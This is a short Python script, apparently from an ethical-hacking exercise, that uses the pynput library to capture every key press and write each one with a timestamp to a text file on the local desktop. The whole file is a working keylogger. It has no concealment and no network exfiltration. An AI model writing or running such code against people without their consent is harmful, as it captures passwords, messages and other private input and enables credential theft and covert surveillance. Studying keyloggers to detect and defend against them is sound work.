from pynput.keyboard import Key,Listener
import logging
log_dir=r"C:/Users/mane7/OneDrive/Desktop/EH/"
logging.basicConfig(filename=(log_dir+"key_log.txt"),level=logging.DEBUG,format='%(asctime)s:%(message)s')

def on_press(key):
    logging.info(format(key))

with Listener(on_press=on_press) as listener:
    listener.join()
